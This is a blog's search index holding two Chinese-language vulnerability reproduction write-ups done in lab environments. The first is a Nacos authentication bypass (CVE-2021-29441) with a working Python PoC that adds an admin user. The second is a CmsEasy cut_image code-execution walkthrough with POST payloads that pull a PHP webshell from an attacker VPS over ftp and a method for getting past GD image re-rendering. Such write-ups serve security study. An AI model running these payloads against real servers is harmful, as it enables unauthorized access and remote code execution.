<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Nacos_认证绕过漏洞(CVE-2021-29441)</title>
      <link href="/2023/07/10/Nacos-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2021-29441/"/>
      <url>/2023/07/10/Nacos-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2021-29441/</url>
      
        <content type="html"><![CDATA[<h1 id="Nacos-认证绕过漏洞-CVE-2021-29441"><a href="#Nacos-认证绕过漏洞-CVE-2021-29441" class="headerlink" title="Nacos_认证绕过漏洞(CVE-2021-29441)"></a>Nacos_认证绕过漏洞(CVE-2021-29441)</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p> Nacos 是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。致力于帮助发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，可以快速实现动态服务发现、服务配置、服务元数据及流量管理。</p><h2 id="产生版本"><a href="#产生版本" class="headerlink" title="产生版本"></a>产生版本</h2><p>nacos &lt;&#x3D;1.4.1</p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>nacos在进行认证授权操作时，会判断请求的user-agent是否为”Nacos-Server”，如果是的话则不进行任何认证。<br>并且利用这个未授权漏洞，攻击者可以获取到用户名密码等敏感信息</p><p>有关于漏洞的具体代码详情以及分析参考如下:</p><ul><li><a href="https://github.com/alibaba/nacos/issues/4701">Report a security vulnerability in nacos to bypass authentication(identity) again</a></li></ul><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境：</p><ul><li>攻击机:windows10 ip: 192.168.101.2</li><li>靶机:kali ip: 192.168.187.129</li></ul><ol><li><p>kali下载并启动<a href="https://vulhub.org/">vulhub</a>靶场</p></li><li><p>确认靶机的nacos服务是否开启<br><img src="https://gitlab.com/chihy525/picgo_picture/-/raw/main/pictures/2023/07/10_19_1_20_1.png"></p></li><li><p>漏洞发生在<code> http://target:8848/nacos/v1/auth/users?</code></p></li><li><p>向users进行传参，构造如下<code>http://target:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9</code><br>需要注意的是这里需要将数据包中的User-Agent设置为Nacos-Server，否则会出现403Forbidden<br><img src="https://gitlab.com/chihy525/picgo_picture/-/raw/main/pictures/2023/07/10_19_23_42_3.png" alt="修改User-Agent前"><br><img src="https://gitlab.com/chihy525/picgo_picture/-/raw/main/pictures/2023/07/10_19_25_27_4.png" alt="修改User-Agent后"></p></li><li><p>修改数据包请求方式为POST后，构造如下url进行添加用户<code>http://target:8848/nacos/v1/auth/users?username=test&amp;password=password</code><br><img src="https://gitlab.com/chihy525/picgo_picture/-/raw/main/pictures/2023/07/10_19_34_5_5.png"><br>如上所示即为添加成功</p></li><li><p>输入<code>http://target:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9</code> 查看已有用户<br><img src="https://gitlab.com/chihy525/picgo_picture/-/raw/main/pictures/2023/07/10_19_38_28_6.png"></p></li><li><p>使用新添加的用户进行登录<br><img src="https://gitlab.com/chihy525/picgo_picture/-/raw/main/pictures/2023/07/10_19_42_30_7.png"></p></li><li><p>也可以使用poc进行验证</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Nacos-Server&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">target</span>):</span><br><span class="line">    endpoint = <span class="string">&quot;/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&quot;</span></span><br><span class="line">    r = requests.get(target.strip(<span class="string">&quot;/&quot;</span>) + endpoint, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&quot;pageItems&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span> target + <span class="string">&quot; has vulnerabilities&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="built_in">print</span> target + <span class="string">&quot;has not vulnerabilities&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_user</span>(<span class="params">target</span>):</span><br><span class="line">    add_user_endpoint = <span class="string">&quot;/nacos/v1/auth/users?username=vulhub&amp;password=vulhub&quot;</span></span><br><span class="line"></span><br><span class="line">    r = requests.post(target.strip(<span class="string">&quot;/&quot;</span>) + add_user_endpoint, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&quot;create user ok&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Add User Success&quot;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;New User Info: vulhub/vulhub&quot;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Nacos Login Endpoint: &#123;&#125;/nacos/&quot;</span>.<span class="built_in">format</span>(target)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Add User Failed&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Please specify the target: python poc.py http://xxxxx:8848&quot;</span></span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> check(sys.argv[<span class="number">1</span>]):</span><br><span class="line">        add_user(sys.argv[<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>只需输入命令<code>python poc.py http://target:8848</code>即可</p></li></ol><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://github.com/vulhub/vulhub/blob/master/nacos/CVE-2021-29441/README.zh-cn.md">Nacos 认证绕过漏洞（CVE-2021-29441）</a></li><li><a href="https://github.com/advisories/GHSA-36hp-jr8h-556f">Authentication Bypass</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 Nacos Authentication Bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CmsEasy之cut-image漏洞复现</title>
      <link href="/2023/02/18/CmsEasy%E4%B9%8Bcut-image%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/02/18/CmsEasy%E4%B9%8Bcut-image%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="CmsEasy-cut-image-代码执行漏洞"><a href="#CmsEasy-cut-image-代码执行漏洞" class="headerlink" title="CmsEasy cut_image 代码执行漏洞"></a>CmsEasy cut_image 代码执行漏洞</h1><h2 id="起因："><a href="#起因：" class="headerlink" title="起因："></a>起因：</h2><p>前几天打靶场的时候碰到这个cms，通过搜素发现这个cms的5.6版本的cut_image函数存在代码执行漏洞。由于网上的漏洞描述大部分并不是很详细，再加上本人才疏学浅，导致最终花了大量时间终于把这个漏洞成功复现。所以打算写一篇文章来记录一下。</p><h2 id="分析源码"><a href="#分析源码" class="headerlink" title="分析源码"></a>分析源码</h2><p>通过搜索可以知道漏洞发生在网站根目录下的lib&#x2F;default&#x2F;tool_act.php文件中的cut_image这个函数<br><img src="https://gitlab.com/chihy525/picgo_picture/-/raw/main/pictures/2023/06/27_13_31_8_1roRl8fsWKwqGH2.png" alt="1.png"></p><p>关键在于下面这一行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$new_name</span>=<span class="variable">$new_name_gbk</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title class_">Time</span>::<span class="title function_ invoke__">getMicrotime</span>()).<span class="string">&#x27;.&#x27;</span>.<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;pic&#x27;</span>]));</span><br></pre></td></tr></table></figure><p>由于没有判断pic传参进来的文件名后缀，从而可以getshell。</p><p>但是这里有个地方要注意：</p><ol><li>$_POST[‘pic’]是通过判断前4个字符是不是 http。如果不是，则认为文件是本站文件，会从前面抽取掉baseurl，返回文件相对路径，所以在这里采用ftp协议。</li><li>如果站点不是放在根目录 则需要在payload前面补足 strlen(base_url)+2 位的长度 如果在根目录也要补1位</li><li>通过观察cut_image_action这个函数可以发现，这里POST提交需要同时包含pic、w、h、x1、x2、y1、y2这7个参数。表示的意义如下：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pic --&gt; ftp:// + vps的ip地址 + payload</span><br><span class="line">w=x2=图片宽度</span><br><span class="line">h=y2=图片高度</span><br><span class="line">x1=y1=固定0</span><br></pre></td></tr></table></figure></li></ol><p>第2点举例如下：</p><ul><li><p>如果目标站点类似 <a href="http://example.com/easy/">http://example.com/easy/</a><br>网站程序放在子目录，就需要补上strlen(base_url)+2 &#x3D; strlen(‘easy’)+2&#x3D;6位</p><p>post内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pic=111111ftp://vpsip/payload.php&amp;w=228&amp;h=146&amp;x1=0&amp;x2=228&amp;y1=0&amp;y2=146</span><br></pre></td></tr></table></figure></li><li><p>如果目标站点类似 <a href="http://example.com/">http://example.com</a><br>网站程序放在根目录，只需要补上1位就可以了</p><p>post内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pic=1ftp://vpsip/payload.php&amp;w=228&amp;h=146&amp;x1=0&amp;x2=228&amp;y1=0&amp;y2=146</span><br></pre></td></tr></table></figure></li></ul><h2 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h2><ul><li>攻击机：windows11 IP: 192.168.1.5</li><li>目标机：CentOS8   IP: 192.168.52.129</li></ul><ol><li><p>首先通过浏览器访问目标站点<br> <img src="https://gitlab.com/chihy525/picgo_picture/-/raw/main/pictures/2023/06/27_13_31_58_v4IcZ7HSLOQVaTb.png" alt="2.png"></p></li><li><p>接下来访问有漏洞的界面<br> <img src="https://gitlab.com/chihy525/picgo_picture/-/raw/main/pictures/2023/06/27_13_32_34_eBsRXPua6gpDvhE.png" alt="3.png"></p></li><li><p>准备payload，并添加图片马<br> <img src="https://gitlab.com/chihy525/picgo_picture/-/raw/main/pictures/2023/06/27_13_33_14_JgkpCf5HxZmcPRK.png" alt="3.png"><br> <img src="https://gitlab.com/chihy525/picgo_picture/-/raw/main/pictures/2023/06/27_13_34_14_dsfcBeMyCr4G2i8.png" alt="4.png"></p></li><li><p>确认payload已经添加到图片中，之后修改新生成的图片后缀改为phph<br> <img src="https://gitlab.com/chihy525/picgo_picture/-/raw/main/pictures/2023/06/27_13_34_49_QubANjio5DrMUdq.png" alt="5.png"></p></li><li><p>使用python启动简易ftp服务器<br> <img src="https://gitlab.com/chihy525/picgo_picture/-/raw/main/pictures/2023/06/27_13_35_28_ewBIbGxhLJlm5dk.png" alt="2.png"></p></li><li><p>通过POST提交参数<br> <img src="https://gitlab.com/chihy525/picgo_picture/-/raw/main/pictures/2023/06/27_13_36_14_RNDxh6Q54p7MIVy.jpg" alt="3.jpg"></p></li><li><p>访问发现并没有生效<br> <img src="https://gitlab.com/chihy525/picgo_picture/-/raw/main/pictures/2023/06/27_13_36_50_hXzxO7PtJW2pUQL.jpg" alt="4.jpg"></p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">之后通过询问其他师傅得知这里用到了php的gd库进行了二次渲染，所以这里需要想办法进行绕过。</span><br></pre></td></tr></table></figure></li><li><p>首先上传原始的图片文件，之后下载经过gd库处理的图片<br> <img src="https://gitlab.com/chihy525/picgo_picture/-/raw/main/pictures/2023/06/27_13_37_50_NV4HJ7FQnsoeRZx.jpg" alt="5.jpg"></p><p> <img src="https://gitlab.com/chihy525/picgo_picture/-/raw/main/pictures/2023/06/27_13_38_23_8kSd1g7RIZ5xFPq.jpg" alt="6.jpg"></p></li><li><p>这里使用脚本加工下载下来的图片<br> <img src="https://gitlab.com/chihy525/picgo_picture/-/raw/main/pictures/2023/06/27_13_39_7_XgnVNGDtZKEOhCs.jpg" alt="7.jpg"></p></li><li><p>查看脚本生成的图片，里面已经添加了payload<br><img src="https://gitlab.com/chihy525/picgo_picture/-/raw/main/pictures/2023/06/27_13_39_37_wKTc423RJjoWpeh.jpg" alt="8.jpg"></p></li><li><p>再次将文件后缀名变更为php，之后上传<br><img src="https://gitlab.com/chihy525/picgo_picture/-/raw/main/pictures/2023/06/27_13_40_9_yGkWSqRB9FldZC7.jpg" alt="9.jpg"></p></li><li><p>发现解析成功<br><img src="https://gitlab.com/chihy525/picgo_picture/-/raw/main/pictures/2023/06/27_13_40_39_FisntoK5UzwdSmB.jpg" alt="10.jpg"></p></li></ol><p>第一次写文章。不足之处还请各位大佬多多包涵。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://xz.aliyun.com/t/416">CmsEasy前台无限制GetShell</a></li><li><a href="http://events.jianshu.io/p/366ec49b91c7">CmsEasy 5.5 cut_image 代码执行漏洞</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 cmseasy cut_image </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
